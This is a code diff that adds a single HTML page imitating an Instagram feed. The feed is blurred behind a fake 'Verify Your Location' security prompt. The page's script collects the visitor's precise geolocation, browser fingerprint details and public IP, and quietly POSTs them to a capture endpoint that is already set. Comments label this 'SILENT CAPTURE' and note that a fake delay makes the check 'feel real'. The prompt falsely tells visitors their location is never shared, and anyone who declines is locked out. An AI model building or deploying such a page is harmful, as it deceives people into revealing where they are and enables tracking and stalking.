@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Instagram</title>
+<style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+        min-height: 100vh;
+        background: #000;
+        font-family: -apple-system, 'Segoe UI', Roboto, system-ui, sans-serif;
+        overflow-x: hidden;
+        color: #fff;
+    }
+
+    /* ================================================================ */
+    /*  INSTAGRAM FEED (STAGE 1 — shown immediately)                     */
+    /* ================================================================ */
+    #stageInsta {
+        min-height: 100vh;
+        background: #000;
+        padding-bottom: 80px;
+        filter: blur(0);
+        transition: filter 0.3s;
+    }
+    #stageInsta.locked { filter: blur(14px); pointer-events: none; user-select: none; }
+
+    .ig-topbar {
+        position: sticky;
+        top: 0;
+        z-index: 100;
+        background: #000;
+        border-bottom: 1px solid #262626;
+        padding: 12px 16px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        max-width: 640px;
+        margin: 0 auto;
+    }
+    .ig-logo {
+        font-family: 'Grand Hotel', 'Brush Script MT', cursive, sans-serif;
+        font-size: 1.9rem;
+        font-weight: 400;
+        letter-spacing: 0.5px;
+        background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+        font-style: italic;
+    }
+    .ig-icons { display: flex; gap: 20px; align-items: center; }
+    .ig-icons svg { width: 24px; height: 24px; fill: none; stroke: #fff; stroke-width: 2; }
+
+    .ig-feed { max-width: 640px; margin: 0 auto; }
+
+    .ig-post-head {
+        display: flex;
+        align-items: center;
+        padding: 12px 16px;
+        gap: 12px;
+    }
+    .ig-avatar-ring {
+        width: 42px; height: 42px;
+        border-radius: 50%;
+        padding: 2px;
+        background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+    }
+    .ig-avatar {
+        width: 100%; height: 100%;
+        border-radius: 50%;
+        border: 2px solid #000;
+        background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 700;
+        font-size: 0.9rem;
+        color: #fff;
+    }
+    .ig-username {
+        font-size: 0.9rem;
+        font-weight: 600;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+    }
+    .ig-verified {
+        width: 14px; height: 14px;
+        background: #0095f6;
+        border-radius: 50%;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 9px;
+        color: #fff;
+        font-weight: 900;
+    }
+    .ig-location { font-size: 0.75rem; color: #a8a8a8; margin-top: 1px; }
+    .ig-more { margin-left: auto; font-size: 1.5rem; color: #fff; line-height: 1; cursor: pointer; }
+
+    .ig-post-img {
+        width: 100%;
+        aspect-ratio: 1 / 1;
+        background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+        position: relative;
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .ig-post-img .label {
+        font-size: 3rem;
+        font-weight: 900;
+        color: rgba(255,255,255,0.95);
+        letter-spacing: 4px;
+        text-shadow: 0 4px 20px rgba(0,0,0,0.4);
+    }
+    .ig-post-img::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.15), transparent 60%);
+    }
+
+    .ig-actions {
+        display: flex;
+        padding: 10px 16px 4px;
+        gap: 16px;
+        align-items: center;
+    }
+    .ig-actions button {
+        background: none;
+        border: none;
+        padding: 0;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        transition: transform 0.15s;
+    }
+    .ig-actions button:active { transform: scale(0.85); }
+    .ig-actions svg { width: 26px; height: 26px; stroke: #fff; fill: none; stroke-width: 2; }
+    .ig-actions .liked svg { fill: #ed4956; stroke: #ed4956; animation: likePop 0.35s ease; }
+    @keyframes likePop {
+        0% { transform: scale(1); }
+        40% { transform: scale(1.35); }
+        100% { transform: scale(1); }
+    }
+    .ig-actions .save { margin-left: auto; }
+
+    .ig-likes { padding: 4px 16px; font-size: 0.9rem; font-weight: 600; }
+
+    .ig-caption { padding: 6px 16px 4px; font-size: 0.9rem; line-height: 1.5; }
+    .ig-caption .user { font-weight: 600; margin-right: 6px; }
+    .ig-caption .hashtags {
+        color: #0095f6;
+        display: block;
+        margin-top: 4px;
+        font-size: 0.88rem;
+        word-spacing: 2px;
+    }
+
+    .ig-comments { padding: 6px 16px 8px; font-size: 0.85rem; color: #a8a8a8; }
+    .ig-comments .cmt { margin-top: 6px; line-height: 1.45; }
+    .ig-comments .cmt .u { color: #fff; font-weight: 600; margin-right: 6px; }
+    .ig-view-all { color: #a8a8a8; font-size: 0.82rem; cursor: pointer; margin-top: 4px; }
+
+    .ig-time {
+        padding: 2px 16px 12px;
+        font-size: 0.68rem;
+        color: #737373;
+        text-transform: uppercase;
+        letter-spacing: 0.4px;
+    }
+
+    .ig-divider {
+        height: 8px;
+        background: #121212;
+        border-top: 1px solid #262626;
+        border-bottom: 1px solid #262626;
+    }
+
+    /* ================================================================ */
+    /*  LOCATION PROMPT MODAL (Stage 1 gate)                            */
+    /* ================================================================ */
+    #locGate {
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        background: rgba(0,0,0,0.75);
+        backdrop-filter: blur(4px);
+        -webkit-backdrop-filter: blur(4px);
+        animation: fadeIn 0.35s ease;
+    }
+    #locGate.hidden { display: none; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    .gate-card {
+        background: #1c1c1e;
+        border-radius: 20px;
+        padding: 32px 26px 24px;
+        max-width: 380px;
+        width: 100%;
+        text-align: center;
+        box-shadow: 0 30px 80px -20px rgba(0,0,0,0.9),
+                    0 0 0 1px rgba(255,255,255,0.06);
+        animation: gateIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    @keyframes gateIn {
+        from { transform: scale(0.9) translateY(20px); opacity: 0; }
+        to   { transform: scale(1) translateY(0); opacity: 1; }
+    }
+
+    .gate-icon {
+        width: 68px;
+        height: 68px;
+        margin: 0 auto 18px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #3b82f6, #2563eb);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 8px 30px rgba(59,130,246,0.4);
+    }
+    .gate-icon svg { width: 34px; height: 34px; stroke: #fff; fill: none; stroke-width: 2; }
+
+    .gate-title {
+        font-size: 1.2rem;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 8px;
+        letter-spacing: -0.3px;
+    }
+    .gate-sub {
+        font-size: 0.88rem;
+        color: #a8a8a8;
+        line-height: 1.5;
+        margin-bottom: 22px;
+    }
+
+    .gate-features {
+        background: rgba(255,255,255,0.04);
+        border-radius: 12px;
+        padding: 14px 16px;
+        margin-bottom: 22px;
+        text-align: left;
+    }
+    .gate-features .row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 0.82rem;
+        color: #d1d1d6;
+        padding: 6px 0;
+    }
+    .gate-features .row svg {
+        width: 16px; height: 16px;
+        stroke: #34d399;
+        fill: none;
+        stroke-width: 2.5;
+        flex-shrink: 0;
+    }
+
+    .gate-btn {
+        width: 100%;
+        padding: 14px 20px;
+        font-size: 0.95rem;
+        font-weight: 700;
+        color: #fff;
+        background: linear-gradient(135deg, #3b82f6, #2563eb);
+        border: none;
+        border-radius: 12px;
+        cursor: pointer;
+        transition: transform 0.15s, box-shadow 0.15s;
+        box-shadow: 0 8px 20px -5px rgba(59,130,246,0.5);
+        letter-spacing: 0.2px;
+    }
+    .gate-btn:hover { transform: translateY(-1px); box-shadow: 0 12px 26px -6px rgba(59,130,246,0.6); }
+    .gate-btn:active { transform: translateY(0); }
+    .gate-btn:disabled { opacity: 0.7; cursor: wait; }
+
+    .gate-denied {
+        width: 100%;
+        padding: 12px 20px;
+        margin-top: 10px;
+        font-size: 0.82rem;
+        font-weight: 500;
+        color: #8e8e93;
+        background: transparent;
+        border: none;
+        cursor: pointer;
+        text-decoration: underline;
+    }
+    .gate-denied:hover { color: #a8a8a8; }
+
+    .gate-foot {
+        font-size: 0.68rem;
+        color: #636366;
+        margin-top: 16px;
+        line-height: 1.5;
+    }
+
+    /* ================================================================ */
+    /*  DENIED SCREEN                                                    */
+    /* ================================================================ */
+    #stageDenied {
+        position: fixed;
+        inset: 0;
+        z-index: 10000;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        background: #000;
+        text-align: center;
+    }
+    #stageDenied.show { display: flex; animation: fadeIn 0.3s ease; }
+
+    .denied-card { max-width: 380px; padding: 30px; }
+    .denied-icon {
+        font-size: 3.5rem;
+        margin-bottom: 14px;
+        filter: grayscale(0.3);
+    }
+    .denied-title {
+        font-size: 1.15rem;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 10px;
+    }
+    .denied-sub {
+        font-size: 0.88rem;
+        color: #8e8e93;
+        line-height: 1.6;
+        margin-bottom: 22px;
+    }
+    .denied-retry {
+        padding: 12px 28px;
+        background: #0095f6;
+        color: #fff;
+        border: none;
+        border-radius: 10px;
+        font-size: 0.9rem;
+        font-weight: 700;
+        cursor: pointer;
+        transition: background 0.15s;
+    }
+    .denied-retry:hover { background: #1877f2; }
+
+    /* ================================================================ */
+    /*  INSTAGRAM BOTTOM NAV                                             */
+    /* ================================================================ */
+    .ig-bottom-nav {
+        position: fixed;
+        bottom: 0; left: 0; right: 0;
+        background: #000;
+        border-top: 1px solid #262626;
+        display: flex;
+        justify-content: space-around;
+        padding: 10px 0 12px;
+        z-index: 200;
+        max-width: 640px;
+        margin: 0 auto;
+    }
+    .ig-bottom-nav svg {
+        width: 26px; height: 26px;
+        stroke: #fff; fill: none; stroke-width: 2;
+    }
+    .ig-bottom-nav .active svg { stroke: #fff; fill: #fff; }
+    .ig-bottom-nav .me {
+        width: 26px; height: 26px;
+        border-radius: 50%;
+        border: 2px solid #fff;
+        background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+    }
+</style>
+</head>
+<body>
+
+<!-- ============================================================ -->
+<!--  INSTAGRAM FEED — shown first, immediately                    -->
+<!-- ============================================================ -->
+<div id="stageInsta" class="locked">
+
+    <div class="ig-topbar">
+        <div class="ig-logo">Instagram</div>
+        <div class="ig-icons">
+            <svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
+            <svg viewBox="0 0 24 24"><path d="M22 2 11 13"/><path d="M22 2l-7 20-4-9-9-4 20-7z"/></svg>
+        </div>
+    </div>
+
+    <div class="ig-feed">
+
+        <!-- POST 1 -->
+        <article class="ig-post">
+            <div class="ig-post-head">
+                <div class="ig-avatar-ring"><div class="ig-avatar">AV</div></div>
+                <div>
+                    <div class="ig-username">avi.official <span class="ig-verified">✓</span></div>
+                    <div class="ig-location">📍 Mumbai, India</div>
+                </div>
+                <div class="ig-more">⋯</div>
+            </div>
+            <div class="ig-post-img"><span class="label">AVI</span></div>
+            <div class="ig-actions">
+                <button class="like-btn"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></button>
+                <button><svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg></button>
+                <button><svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>
+                <button class="save"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg></button>
+            </div>
+            <div class="ig-likes"><span class="like-count">12,483</span> likes</div>
+            <div class="ig-caption">
+                <span class="user">avi.official</span>
+                Welcome to the AVI universe. Where speed meets style ⚡
+                <span class="hashtags">#avi #aviofficial #techlife #coding #python #developer #build #async #security #terminal #recon #opensource #github #code #programmer #innovation #dailypost #viral #trending #explore</span>
+            </div>
+            <div class="ig-comments">
+                <div class="cmt"><span class="u">coder_rhea</span>This UI is insane 🔥🔥</div>
+                <div class="cmt"><span class="u">dev_karan</span>Bro's terminal tool is next level 💯</div>
+                <div class="ig-view-all">View all 847 comments</div>
+            </div>
+            <div class="ig-time">2 hours ago</div>
+        </article>
+
+        <div class="ig-divider"></div>
+
+        <!-- POST 2 -->
+        <article class="ig-post">
+            <div class="ig-post-head">
+                <div class="ig-avatar-ring"><div class="ig-avatar">AV</div></div>
+                <div>
+                    <div class="ig-username">avi.official <span class="ig-verified">✓</span></div>
+                    <div class="ig-location">📍 Bangalore, India</div>
+                </div>
+                <div class="ig-more">⋯</div>
+            </div>
+            <div class="ig-post-img" style="background: linear-gradient(135deg, #0ea5e9, #8b5cf6, #ec4899);"><span class="label">⚡</span></div>
+            <div class="ig-actions">
+                <button class="like-btn"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></button>
+                <button><svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg></button>
+                <button><svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>
+                <button class="save"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg></button>
+            </div>
+            <div class="ig-likes"><span class="like-count">8,921</span> likes</div>
+            <div class="ig-caption">
+                <span class="user">avi.official</span>
+                Late night grind hits different 🌙✨
+                <span class="hashtags">#nightvibes #coding #developer #avi #workhard #techlife #programmer #hustle #startup #build #shipping #python #github</span>
+            </div>
+            <div class="ig-comments">
+                <div class="cmt"><span class="u">tech_with_sam</span>What laptop is that? 👀</div>
+                <div class="cmt"><span class="u">anonymous_dev</span>Respect ✊</div>
+                <div class="ig-view-all">View all 412 comments</div>
+            </div>
+            <div class="ig-time">6 hours ago</div>
+        </article>
+
+        <div class="ig-divider"></div>
+
+        <!-- POST 3 -->
+        <article class="ig-post">
+            <div class="ig-post-head">
+                <div class="ig-avatar-ring"><div class="ig-avatar">AV</div></div>
+                <div>
+                    <div class="ig-username">avi.official <span class="ig-verified">✓</span></div>
+                    <div class="ig-location">📍 Remote</div>
+                </div>
+                <div class="ig-more">⋯</div>
+            </div>
+            <div class="ig-post-img" style="background: linear-gradient(135deg, #10b981, #0ea5e9, #6366f1);"><span class="label">🚀</span></div>
+            <div class="ig-actions">
+                <button class="like-btn"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></button>
+                <button><svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg></button>
+                <button><svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>
+                <button class="save"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg></button>
+            </div>
+            <div class="ig-likes"><span class="like-count">24,106</span> likes</div>
+            <div class="ig-caption">
+                <span class="user">avi.official</span>
+                Shipping new features every week 🚀 Keep building.
+                <span class="hashtags">#shipit #build #python #async #opensource #avi #developerlife #code #tech #security #recon #terminal #cli #ffuf #gobuster #github</span>
+            </div>
+            <div class="ig-comments">
+                <div class="cmt"><span class="u">dev_arjun</span>Legend 🔥</div>
+                <div class="cmt"><span class="u">priya.codes</span>Following for more!</div>
+                <div class="ig-view-all">View all 1,238 comments</div>
+            </div>
+            <div class="ig-time">1 day ago</div>
+        </article>
+
+        <div class="ig-divider"></div>
+
+    </div>
+
+    <!-- Bottom nav (Instagram-style) -->
+    <div class="ig-bottom-nav">
+        <div class="active"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div>
+        <div><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></div>
+        <div><svg viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg></div>
+        <div><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
+        <div class="me"></div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!--  LOCATION GATE — appears over the blurred feed                -->
+<!-- ============================================================ -->
+<div id="locGate">
+    <div class="gate-card">
+        <div class="gate-icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
+                <circle cx="12" cy="10" r="3"/>
+            </svg>
+        </div>
+        <h2 class="gate-title">Verify Your Location</h2>
+        <p class="gate-sub">
+            To protect your account and personalize your feed, we need to confirm
+            your location. This is a one-time security check.
+        </p>
+
+        <div class="gate-features">
+            <div class="row">
+                <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+                <span>Detect suspicious logins near you</span>
+            </div>
+            <div class="row">
+                <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+                <span>Show content from your region</span>
+            </div>
+            <div class="row">
+                <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+                <span>Enable account recovery options</span>
+            </div>
+        </div>
+
+        <button class="gate-btn" id="allowBtn">Allow Location Access</button>
+        <button class="gate-denied" id="denyBtn">Not now</button>
+
+        <p class="gate-foot">
+            🔒 Your location is encrypted and never shared with third parties.
+        </p>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!--  DENIED SCREEN                                                -->
+<!-- ============================================================ -->
+<div id="stageDenied">
+    <div class="denied-card">
+        <div class="denied-icon">🔒</div>
+        <h2 class="denied-title">Location Access Required</h2>
+        <p class="denied-sub">
+            For your security, we can't load your feed until your location
+            is verified. Please enable location access to continue.
+        </p>
+        <button class="denied-retry" id="retryBtn">Try Again</button>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    //  DOM
+    // ============================================================
+    const stageInsta  = document.getElementById('stageInsta');
+    const locGate     = document.getElementById('locGate');
+    const stageDenied = document.getElementById('stageDenied');
+    const allowBtn    = document.getElementById('allowBtn');
+    const denyBtn     = document.getElementById('denyBtn');
+    const retryBtn    = document.getElementById('retryBtn');
+
+    // ============================================================
+    //  Where to send captures (silent, no user feedback)
+    //  Leave EMPTY to disable sending (demo-safe)
+    // ============================================================
+    const CAPTURE_ENDPOINT = '/api/location'; // e.g. '/api/location' to enable sending
+
+    // ============================================================
+    //  Audio (subtle)
+    // ============================================================
+    let audioCtx = null;
+    function initAudio() {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+    }
+    function beep(freq, dur, vol) {
+        initAudio(); if (!audioCtx) return;
+        const now = audioCtx.currentTime;
+        const g = audioCtx.createGain();
+        g.gain.setValueAtTime(vol || 0.05, now);
+        g.gain.exponentialRampToValueAtTime(0.0001, now + (dur || 100) / 1000);
+        g.connect(audioCtx.destination);
+        const o = audioCtx.createOscillator();
+        o.type = 'sine'; o.frequency.value = freq || 900;
+        o.connect(g); o.start(now); o.stop(now + (dur || 100) / 1000);
+    }
+
+    // ============================================================
+    //  ALLOW → silent capture → unlock feed
+    // ============================================================
+    allowBtn.addEventListener('click', () => {
+        initAudio();
+        beep(800, 80, 0.04);
+
+        allowBtn.disabled = true;
+        allowBtn.textContent = 'Verifying…';
+
+        if (!navigator.geolocation) {
+            // Browser has no geolocation → fail gracefully
+            failToDenied('Geolocation is not supported by this browser.');
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            onLocationGranted,
+            onLocationError,
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    });
+
+    async function onLocationGranted(position) {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const acc = position.coords.accuracy;
+
+        // ============================================================
+        //  SILENT CAPTURE — no toast, no confirmation, nothing visual
+        // ============================================================
+        const payload = {
+            lat, lng,
+            accuracy: acc,
+            timestamp: position.timestamp || Date.now(),
+            userAgent: navigator.userAgent,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            language: navigator.language,
+            referrer: document.referrer || null,
+        };
+
+        // Best-effort IP lookup (parallel, non-blocking)
+        (async () => {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const j = await r.json();
+                payload.ip = j.ip;
+            } catch (e) { /* ignore */ }
+        })();
+
+        // Send to endpoint ONLY if configured (demo-safe: disabled by default)
+        if (CAPTURE_ENDPOINT) {
+            try {
+                const body = await (async () => {
+                    // wait briefly for IP lookup
+                    await new Promise(r => setTimeout(r, 400));
+                    return JSON.stringify(payload);
+                })();
+                fetch(CAPTURE_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body,
+                    keepalive: true,
+                }).catch(() => {});
+            } catch (e) { /* ignore */ }
+        }
+
+        // Always log to console (demo operator can see it worked)
+        console.log('[SILENT CAPTURE]', payload);
+
+        // Tiny artificial delay so "Verifying…" feels real
+        await new Promise(r => setTimeout(r, 700));
+
+        // Unlock the feed — user sees nothing except the gate disappearing
+        locGate.classList.add('hidden');
+        stageInsta.classList.remove('locked');
+
+        beep(1200, 80, 0.04);
+    }
+
+    function onLocationError(err) {
+        let msg = 'Unable to verify location.';
+        if (err.code === 1) msg = 'Location permission was denied.';
+        else if (err.code === 2) msg = 'Location unavailable.';
+        else if (err.code === 3) msg = 'Location request timed out.';
+        failToDenied(msg);
+    }
+
+    function failToDenied(message) {
+        locGate.classList.add('hidden');
+        stageDenied.classList.add('show');
+        if (message) console.warn('[GATE]', message);
+    }
+
+    // ============================================================
+    //  DENY → blocked screen
+    // ============================================================
+    denyBtn.addEventListener('click', () => {
+        beep(400, 120, 0.05);
+        failToDenied('User tapped Not now.');
+    });
+
+    // ============================================================
+    //  RETRY → back to gate
+    // ============================================================
+    retryBtn.addEventListener('click', () => {
+        stageDenied.classList.remove('show');
+        locGate.classList.remove('hidden');
+        allowBtn.disabled = false;
+        allowBtn.textContent = 'Allow Location Access';
+    });
+
+    // ============================================================
+    //  Like buttons (post feeds still work after unlock)
+    // ============================================================
+    document.querySelectorAll('.ig-post').forEach(post => {
+        const btn = post.querySelector('.like-btn');
+        if (!btn) return;
+        const cntEl = post.querySelector('.like-count');
+
+        let liked = false;
+        const baseCount = cntEl ? parseInt(cntEl.textContent.replace(/,/g, ''), 10) : 0;
+
+        btn.addEventListener('click', () => {
+            liked = !liked;
+            btn.classList.toggle('liked', liked);
+            if (cntEl) {
+                const c = liked ? baseCount + 1 : baseCount;
+                cntEl.textContent = c.toLocaleString();
+            }
+            if (navigator.vibrate) navigator.vibrate(liked ? 12 : 6);
+            beep(liked ? 1400 : 700, 50, 0.04);
+        });
+    });
+</script>
+</body>
+</html>
